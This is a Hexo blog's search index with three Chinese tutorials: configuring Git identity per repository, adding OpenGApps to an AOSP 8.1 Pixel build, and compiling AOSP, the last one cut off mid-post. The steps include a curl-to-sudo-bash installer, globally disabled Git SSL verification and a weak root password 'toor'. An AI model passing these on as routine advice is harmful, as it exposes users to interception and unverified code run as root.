<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Git用户名邮箱的全局配置和单仓库配置(不同项目使用不同账号登录)</title>
      <link href="/2024/02/22/Git%E7%94%A8%E6%88%B7%E5%90%8D%E9%82%AE%E7%AE%B1%E7%9A%84%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE%E5%92%8C%E5%8D%95%E4%BB%93%E5%BA%93%E9%85%8D%E7%BD%AE-%E4%B8%8D%E5%90%8C%E9%A1%B9%E7%9B%AE%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95/"/>
      <url>/2024/02/22/Git%E7%94%A8%E6%88%B7%E5%90%8D%E9%82%AE%E7%AE%B1%E7%9A%84%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE%E5%92%8C%E5%8D%95%E4%BB%93%E5%BA%93%E9%85%8D%E7%BD%AE-%E4%B8%8D%E5%90%8C%E9%A1%B9%E7%9B%AE%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="1、需求"><a href="#1、需求" class="headerlink" title="1、需求"></a>1、需求</h3><p>因工作和个人的仓库地址、用户名和邮箱都不一样,很多时候一个git账号无法满足工作和个人学习并行的需求。<br>全局用户名和邮箱是本地 git 客户端的变量，可配置，不随 git 库而改变。gitee 和 github 是按邮箱来统计贡献者（Contributors）的。</p><blockquote><p>我们的目的是在特定项目里设置特定的账号!</p></blockquote><h3 id="2、全局账号和当前仓库账号"><a href="#2、全局账号和当前仓库账号" class="headerlink" title="2、全局账号和当前仓库账号"></a>2、全局账号和当前仓库账号</h3><h4 id="2-1、全局账号"><a href="#2-1、全局账号" class="headerlink" title="2.1、全局账号"></a>2.1、全局账号</h4><p>通过git config –global user.name和git config –global user.email设置的账号信息,作用于所有仓库。<br>例如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your@email.com&quot;</span></span><br></pre></td></tr></table></figure><h4 id="2-2、当前仓库账号"><a href="#2-2、当前仓库账号" class="headerlink" title="2.2、当前仓库账号"></a>2.2、当前仓库账号</h4><p>可以通过git config user.name和git config user.email在某个仓库中指定特定的用户名和邮箱。<br>例如在仓库文件夹下运行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name <span class="string">&quot;username&quot;</span> </span><br><span class="line">git config user.email <span class="string">&quot;email@email.com&quot;</span></span><br></pre></td></tr></table></figure><p>这会覆盖全局账号,对当前仓库生效。<br>查看账号,通过命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config -l</span><br></pre></td></tr></table></figure><p>可以查看全局和本地账号配置信息。</p><p>一般来说,全局 Git 账号配置为个人账号会更好一些。许多开源项目推荐使用个人邮箱而非公司邮箱。<br>全局 Git 账号通常设置为你自己的个人邮箱,用于标识个人工作。根据项目需要,再单独配置不同的本地仓库账号。这样可以最大程度保持个人提交记录的完整性和连续性。</p><h3 id="3、原文链接"><a href="#3、原文链接" class="headerlink" title="3、原文链接"></a>3、原文链接</h3><p><a href="https://blog.csdn.net/inthat/article/details/132116332">https://blog.csdn.net/inthat/article/details/132116332</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为Android8.1.0_r1添加opengapps</title>
      <link href="/2024/02/04/%E4%B8%BAAndroid8-1-0-r1%E6%B7%BB%E5%8A%A0opengapps/"/>
      <url>/2024/02/04/%E4%B8%BAAndroid8-1-0-r1%E6%B7%BB%E5%8A%A0opengapps/</url>
      
        <content type="html"><![CDATA[<h3 id="1、添加opengapps的下载地址"><a href="#1、添加opengapps的下载地址" class="headerlink" title="1、添加opengapps的下载地址"></a>1、添加opengapps的下载地址</h3><p>修改在AOSP源码根路径下的.repo&#x2F;manifests&#x2F;default.xml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:~/srcAndroid$ gedit .repo/manifests/default.xml </span><br></pre></td></tr></table></figure><p>在末尾前添加内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">remote</span> <span class="attr">name</span>=<span class="string">&quot;opengapps&quot;</span> <span class="attr">fetch</span>=<span class="string">&quot;https://github.com/opengapps/&quot;</span>  /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">remote</span> <span class="attr">name</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> <span class="attr">fetch</span>=<span class="string">&quot;https://gitlab.opengapps.org/opengapps/&quot;</span>  /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/build&quot;</span> <span class="attr">name</span>=<span class="string">&quot;aosp_build&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/sources/all&quot;</span> <span class="attr">name</span>=<span class="string">&quot;all&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- arm64 depends on arm --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/sources/arm&quot;</span> <span class="attr">name</span>=<span class="string">&quot;arm&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/sources/arm64&quot;</span> <span class="attr">name</span>=<span class="string">&quot;arm64&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/sources/x86&quot;</span> <span class="attr">name</span>=<span class="string">&quot;x86&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;vendor/opengapps/sources/x86_64&quot;</span> <span class="attr">name</span>=<span class="string">&quot;x86_64&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;opengapps-gitlab&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、安装lfs等工具"><a href="#2、安装lfs等工具" class="headerlink" title="2、安装lfs等工具"></a>2、安装lfs等工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:~/srcAndroid$ sudo apt install git-lfs</span><br><span class="line">[sudo] password <span class="keyword">for</span> owner: </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">E: Unable to locate package git-lfs</span><br><span class="line">owner@ubuntu:~/srcAndroid$ curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.deb.sh | sudo bash</span><br><span class="line">Detected operating system as Ubuntu/xenial.</span><br><span class="line">Checking <span class="keyword">for</span> curl...</span><br><span class="line">Detected curl...</span><br><span class="line">Checking <span class="keyword">for</span> gpg...</span><br><span class="line">Detected gpg...</span><br><span class="line">Detected apt version as 1.2.32ubuntu0.2</span><br><span class="line">Running apt-get update... <span class="keyword">done</span>.</span><br><span class="line">Installing apt-transport-https... <span class="keyword">done</span>.</span><br><span class="line">Installing /etc/apt/sources.list.d/github_git-lfs.list...done.</span><br><span class="line">Importing packagecloud gpg key... Packagecloud gpg key imported to /etc/apt/keyrings/github_git-lfs-archive-keyring.gpg</span><br><span class="line"><span class="keyword">done</span>.</span><br><span class="line">Running apt-get update... <span class="keyword">done</span>.</span><br><span class="line"></span><br><span class="line">The repository is setup! You can now install packages.</span><br><span class="line">owner@ubuntu:~/srcAndroid$ sudo apt install git-lfs</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following packages were automatically installed and are no longer required:</span><br><span class="line">  linux-headers-4.4.0-31 linux-headers-4.4.0-31-generic linux-image-4.4.0-31-generic linux-image-extra-4.4.0-31-generic</span><br><span class="line">Use <span class="string">&#x27;sudo apt autoremove&#x27;</span> to remove them.</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  git-lfs</span><br><span class="line">0 upgraded, 1 newly installed, 0 to remove and 243 not upgraded.</span><br><span class="line">Need to get 7168 kB of archives.</span><br><span class="line">After this operation, 15.6 MB of additional disk space will be used.</span><br><span class="line">Get:1 https://packagecloud.io/github/git-lfs/ubuntu xenial/main amd64 git-lfs amd64 3.2.0 [7168 kB]</span><br><span class="line">Fetched 7168 kB <span class="keyword">in</span> 2s (2483 kB/s)  </span><br><span class="line">Selecting previously unselected package git-lfs.</span><br><span class="line">(Reading database ... 241488 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../git-lfs_3.2.0_amd64.deb ...</span><br><span class="line">Unpacking git-lfs (3.2.0) ...</span><br><span class="line">Processing triggers <span class="keyword">for</span> man-db (2.7.5-1) ...</span><br><span class="line">Setting up git-lfs (3.2.0) ...</span><br><span class="line">Git LFS initialized.</span><br><span class="line">owner@ubuntu:~/srcAndroid$ git lfs install</span><br><span class="line">Git LFS initialized.</span><br><span class="line">owner@ubuntu:~/srcAndroid$ sudo apt install lunzip</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following packages were automatically installed and are no longer required:</span><br><span class="line">  linux-headers-4.4.0-31 linux-headers-4.4.0-31-generic linux-image-4.4.0-31-generic linux-image-extra-4.4.0-31-generic</span><br><span class="line">Use <span class="string">&#x27;sudo apt autoremove&#x27;</span> to remove them.</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  lunzip</span><br><span class="line">0 upgraded, 1 newly installed, 0 to remove and 243 not upgraded.</span><br><span class="line">Need to get 21.7 kB of archives.</span><br><span class="line">After this operation, 80.9 kB of additional disk space will be used.</span><br><span class="line">Get:1 http://mirrors.aliyun.com/ubuntu xenial/universe amd64 lunzip amd64 1.7-1 [21.7 kB]</span><br><span class="line">Fetched 21.7 kB <span class="keyword">in</span> 0s (90.5 kB/s)</span><br><span class="line">Selecting previously unselected package lunzip.</span><br><span class="line">(Reading database ... 241527 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../lunzip_1.7-1_amd64.deb ...</span><br><span class="line">Unpacking lunzip (1.7-1) ...</span><br><span class="line">Processing triggers <span class="keyword">for</span> man-db (2.7.5-1) ...</span><br><span class="line">Setting up lunzip (1.7-1) ...</span><br></pre></td></tr></table></figure><h3 id="3、同步opengapps代码"><a href="#3、同步opengapps代码" class="headerlink" title="3、同步opengapps代码"></a>3、同步opengapps代码</h3><h4 id="3-1、不验证ssl"><a href="#3-1、不验证ssl" class="headerlink" title="3.1、不验证ssl"></a>3.1、不验证ssl</h4><p>添加下面命令，否则gitlab拉取会出错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:~/srcAndroid$ git config --global http.sslVerify <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="3-2、同步代码"><a href="#3-2、同步代码" class="headerlink" title="3.2、同步代码"></a>3.2、同步代码</h4><p>同步opengapps代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:~/srcAndroid$ ~/repo <span class="built_in">sync</span></span><br><span class="line">owner@ubuntu:~/srcAndroid$ ~/repo forall -c <span class="string">&quot;pwd;git lfs pull&quot;</span></span><br></pre></td></tr></table></figure><h3 id="4、编译"><a href="#4、编译" class="headerlink" title="4、编译"></a>4、编译</h3><h4 id="4-1、修改配置文件，将opengapps添加到系统编译"><a href="#4-1、修改配置文件，将opengapps添加到系统编译" class="headerlink" title="4.1、修改配置文件，将opengapps添加到系统编译"></a>4.1、修改配置文件，将opengapps添加到系统编译</h4><p>编辑device-sailfish.mk文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:~/srcAndroid$ gedit device/google/marlin/device-sailfish.mk</span><br></pre></td></tr></table></figure><p>在文件末尾添加</p><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GAPPS_VARIANT := micro</span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> inherit-product, vendor/opengapps/build/opengapps-packages.mk)</span></span><br></pre></td></tr></table></figure><p>添加gms后，编译system.img时（在整个编译的99%），system image is out of space，The max is 2048 MB错误，所以将GAPPS_VARIANT值由mini改为micro，最终成功编译。</p><p>编辑aosp_sailfish.mk文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:~/srcAndroid$ gedit device/google/marlin/aosp_sailfish.mk</span><br></pre></td></tr></table></figure><p>修改如下值为false</p><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PRODUCT_RESTRICT_VENDOR_FILES := false</span><br></pre></td></tr></table></figure><h4 id="4-2、正常编译"><a href="#4-2、正常编译" class="headerlink" title="4.2、正常编译"></a>4.2、正常编译</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">lunch aosp_sailfish-userdebug</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure><h3 id="5、参考"><a href="#5、参考" class="headerlink" title="5、参考"></a>5、参考</h3><p>OpenGApps仓库地址：<br><a href="https://github.com/opengapps/aosp_build">https://github.com/opengapps/aosp_build</a></p><p>GApps不完全等同GMS (Google Service Framework，Google服務框架)，扫盲<br><a href="https://ivonblog.com/posts/android-gapps-comparison/">https://ivonblog.com/posts/android-gapps-comparison/</a></p><p>各个包full、mini等包含app的区别<br><a href="https://github.com/opengapps/opengapps/wiki/Package-Comparison">https://github.com/opengapps/opengapps/wiki/Package-Comparison</a></p><p><a href="https://blog.xistor.top/post/add_opengapps_to_aosp/">https://blog.xistor.top/post/add_opengapps_to_aosp/</a><br><a href="https://c55jeremy-tech.blogspot.com/2019/04/aosppixel-2-romrom.html">https://c55jeremy-tech.blogspot.com/2019/04/aosppixel-2-romrom.html</a><br><a href="https://www.cnblogs.com/DXCyber409/p/15417423.html">https://www.cnblogs.com/DXCyber409/p/15417423.html</a><br><a href="https://monkd404.github.io/2020/11/10/%E5%A6%82%E4%BD%95%E8%B0%83%E6%95%99%E4%B8%80%E5%8F%B0%E5%AE%8C%E7%BE%8E%E6%B5%8B%E8%AF%95%E6%9C%BA/">https://monkd404.github.io/2020/11/10/%E5%A6%82%E4%BD%95%E8%B0%83%E6%95%99%E4%B8%80%E5%8F%B0%E5%AE%8C%E7%BE%8E%E6%B5%8B%E8%AF%95%E6%9C%BA/</a></p><h3 id="6、其他相关知识"><a href="#6、其他相关知识" class="headerlink" title="6、其他相关知识"></a>6、其他相关知识</h3><ul><li><p>设备注册（暂时也没用）<br>  <a href="https://www.google.com/android/uncertified/">https://www.google.com/android/uncertified/</a></p><p>  挂上代理，进入Play商店，等待出现设备未验证的提示，此时才会生成一个GMS ANDROID ID<br>  adb root ;<br>  adb shell ‘sqlite3 &#x2F;data&#x2F;data&#x2F;com.google.android.gsf&#x2F;databases&#x2F;gservices.db “select * from main where name &#x3D; &quot;android_id&quot;;”‘<br>  在 <a href="https://www.google.com/android/uncertified/%E4%B8%AD%E5%A1%AB%E5%85%A5">https://www.google.com/android/uncertified/中填入</a> GMS ANDROID ID 即可。</p><p>  注：平台原厂一般会将对应的设备进行google认证，在\device\xxx\xxx\device.mk 文件中会配置对应的fingerprint，由以下信息组成：</p><p>  BUILD_FINGERPRINT :&#x3D; $(PRODUCT_BRAND)&#x2F;$(GP_TARGET_PRODUCT)&#x2F;$(GP_TARGET_DEVICE):$(PLATFORM_VERSION)&#x2F;$(BUILD_ID)&#x2F;$(BF_BUILD_NUMBER):$(TARGET_BUILD_VARIANT)&#x2F;$(BUILD_VERSION_TAGS)</p><p>  通过读取系统属性[ro.build.fingerprint]或[ro.vendor.build.fingerprint]查看fingerprint信息，如果设备已经过了google认证，则导入GMS包后可直接登录Google账号</p></li><li><p>GApps不完全等同GMS<br>  GApps不完全等同GMS (Google Service Framework，Google服務框架)，後者為Google開發的專有軟體，需付費取得認證才可內建在系統；相較之下GApps為第三方開發者維護的版本，可自由安裝使用。<br>  GApps的功用等同一般市售手機搭載的GMS框架。由於GMS為Google開發的專有軟體，使用商標要付錢，手機廠商花錢買授權獲得認證後，便可以將GMS隨手機一起出貨 (參見 Android相容計畫)。 但第三方ROM可不是這樣了，部分第三方ROM開發者為避免爭議選擇不內建GApps，譬如 LineageOS，官網的ROM組建不包含GApps，要使用者自己刷第三方開發者維護的GApps。<br>  部份XDA開發者仍會在ROM內建GApps，嚴格來說這是違法的。GApps因為是系統服務，一般而言得用手機Recovery刷入，無法直接用APK安裝。</p></li><li><p>Android GMS 集成方法<br>  下载zip包<br>  A 在 <a href="https://opengapps.org/">https://opengapps.org/</a> 网站上按照：</p><p>  1, CPU 的架构</p><p>  2,android 版本</p><p>  3，需要下载的包的版本<br>  一般选择 full</p><p>  recovery刷入</p><p>  其他版本解释如下：</p><p>  sup<br>  包含了所有 GApps ，像韩语日语中文拼音中文注音输入法等。（请注意：如果你是用的是基于原生的 ROM ，本版本会<br>  替换相机，通讯录等等所有有关应用）。体积 1G 左右，如果 System 分区剩余空间不够，就会刷入失败。</p><p>  stock<br>  类似于 Google Pixel 出厂内置的 GApps ，相比 super 版少了其他语种的输入法以及 Google 地球等。（请注意：如果你<br>  是用的是基于原生的 ROM ，本版本会替换相机，通讯录等等所有有关应用）。体积 820M~840M 左右，如果 System 分<br>  区剩余空间不够，就会刷入失败。</p><p>  full<br>  与 stock 版所包含的内容相同，但此版本不会替换手机原本的应用。体积 670~690M 左右，如果 System 分区剩余空间不<br>  够，就会刷入失败。</p><p>  mini<br>  包含基础的 Google 服务框架，以及一些影响力较大的 GApps ，相比 full 版去掉了 Docs 等应用。体积 370M<del>390M<br>  左右，如果 System 分区剩余空间不够，就会刷入失败。<br>  micro<br>  包含基础的 Google 服务框架和 Gmail 等常见 GApps。体积 190</del>210M 左右，如果 System 分区剩余空间不够，就会刷<br>  入失败。</p><p>  nano<br>  包含基础的 Google 服务框架，但不会有其他 不必要的 GApps。体积 160M~180M 左右，如果 System 分区剩余空间不<br>  够，就会刷入失败。</p><p>  pico<br>  包含最迷你的 Google 服务框架，但由于框架并非完整，部分 GApps 可能无法运行。体积 110~120M 左右，如果 System<br>  分区剩余空间不够，就会刷入失败。</p><p>  这里为了方便一般下载super版本，因为其他版本有时候会少一些apk。</p><p>  B 下载的压缩包一般命名为 open_gapps-arm64-9.0-micro-20220205.zip 解压后：</p><p>  Core 和 Optional 目录下为谷歌服务核心文件和应用，需要预置到源码中。<br>  GApps 目录下为一些功能应用，可不预置到源码中。<br>  使用 for lz in *.lz;do lzip -d $lz; done 命令循环解压 lz 结尾的压缩包<br>  在源码中新建 根目录&#x2F;google 文件夹放置需要 apk 如下：</p><p>  原文链接：<a href="https://blog.csdn.net/m0_56343264/article/details/131411217">https://blog.csdn.net/m0_56343264/article/details/131411217</a></p></li><li><p>手机型号对照<br>  手机型号     年份      内部研发代号<br>  Pixel       2016      Sailfish（旗鱼）<br>  Pixel XL    2016      Marlin（马林鱼）<br>  Pixel 2     2017      Walleye（玻璃梭鲈）<br>  Pixel 2 XL  2017      Taimen（鳟鱼）Muskie（后取消了），Wahoo was used in the application package name there, but now we know that Wahoo is actually a reference to the unified kernel for the Pixel 2 and Pixel 2 XL.<br>  Pixel 3     2018      Blueline （蓝鳍鱼）<br>  Pixel 3 XL  2018      Crosshatch （十字线鱼）<br>  Pixel 3a    2019      Sargo （重牙鲷）<br>  Pixel 3a XL 2019      Bonito （鲣鱼）<br>  Pixel 4     2019      Flame （火焰鱼）<br>  Pixel 4 XL  2019      Coral （珊瑚鱼）<br>  Pixel 4a    2020      Sunfish（翻车鱼）<br>  Pixel 4a 5G 2020      Bramble（荆棘鱼）<br>  Pixel 5     2020      Redfin（红鳍鱼）<br>  Pixel 5a    2021      Barbet（巨嘴鸟）<br>  Pixel 6     2021      Oriole（黄鹂）<br>  Pixel 6 pro 2021      Raven（乌鸦）</p><p>  注意：Pixel 5a以后不再使用鱼类作为代号，改用鸟类。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> aosp </tag>
            
            <tag> Android </tag>
            
            <tag> opengapps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android8.1.0_r1编译</title>
      <link href="/2024/02/04/Android8-1-0-r1%E7%BC%96%E8%AF%91/"/>
      <url>/2024/02/04/Android8-1-0-r1%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<p>目标系统：<br>OPM1.171019.011android-8.1.0_r1OreoPixel 2 XL, Pixel 2, Pixel XL, Pixel, Pixel C, Nexus 6P, Nexus 5X2017-12-05</p><h3 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h3><h4 id="1-1、切换shell"><a href="#1-1、切换shell" class="headerlink" title="1.1、切换shell"></a>1.1、切换shell</h4><p>查看当前shell类型，如果是zsh，需要修改成bash，重启生效。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br><span class="line">chsh -s /bin/bash</span><br><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure><h4 id="1-2、挂载移动硬盘"><a href="#1-2、挂载移动硬盘" class="headerlink" title="1.2、挂载移动硬盘"></a>1.2、挂载移动硬盘</h4><p>新建本地文件夹，挂载移动硬盘上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /media/owner/CodeDisk</span><br><span class="line">sudo mount /dev/sdc1 /media/owner/CodeDisk</span><br></pre></td></tr></table></figure><h4 id="1-3、python环境准备"><a href="#1-3、python环境准备" class="headerlink" title="1.3、python环境准备"></a>1.3、python环境准备</h4><p>repo要求：python3版本大于3.6及以上<br>编译阶段要求：python2.7<br>（ubuntu16.04自带的是python2.7和python3.5）</p><h3 id="2、下载源码"><a href="#2、下载源码" class="headerlink" title="2、下载源码"></a>2、下载源码</h3><h4 id="2-1、repo同步源代码"><a href="#2-1、repo同步源代码" class="headerlink" title="2.1、repo同步源代码"></a>2.1、repo同步源代码</h4><p>创建源码目录，后续操作都在srcAndroid_8.1.0_r1目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> srcAndroid_8.1.0_r1</span><br><span class="line"><span class="built_in">cd</span> srcAndroid_8.1.0_r1</span><br></pre></td></tr></table></figure><p>配置git信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;username&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;username@gmail.com&quot;</span></span><br></pre></td></tr></table></figure><p>下载repo(因为&#x2F;usr&#x2F;bin&#x2F;必须root用户可写，所以切换root下载repo)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br><span class="line">设置密码toor</span><br><span class="line">su root</span><br><span class="line">curl https://storage.googleapis.com/git-repo-downloads/repo &gt; /usr/bin/repo</span><br><span class="line"><span class="built_in">chmod</span> a+x /usr/bin/repo</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>调整一下python3的优先级，因为要源码同步用到python3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2 100</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 150</span><br></pre></td></tr></table></figure><p>设置同步地址<br>国外地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> https_proxy=http://192.168.1.100:7890 http_proxy=http://192.168.1.100:7890 all_proxy=socks5://192.168.1.100:7890</span><br><span class="line">repo init -u https://android.googlesource.com/platform/manifest -b android-8.1.0_r1</span><br></pre></td></tr></table></figure><p>国内地址：<br>末尾加了–depth&#x3D;1会快很多 因为这样他不会把历史的代码记录给从头到尾克隆过来（只克隆最新一次提交记录），但是不建议这样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-8.1.0_r1 --depth=1</span><br></pre></td></tr></table></figure><p>开始同步：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> ~/Desktop/down.sh down.sh</span><br><span class="line">./down.sh</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo <span class="built_in">sync</span> -c -j8</span><br></pre></td></tr></table></figure><p>第一次repo sync会下载所有源码。如果不是第一次，则会断点续传，下载过的不再重新下载<br>记住重复执行上面这个命令，直到最后的结果是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo <span class="built_in">sync</span> has finished successfully</span><br></pre></td></tr></table></figure><h3 id="3、添加驱动"><a href="#3、添加驱动" class="headerlink" title="3、添加驱动"></a>3、添加驱动</h3><p>首先查看当前系统版本对应的Build号，比如8.1.0_r1对应的是OPM1.171019.011，具体在这里查看<br><a 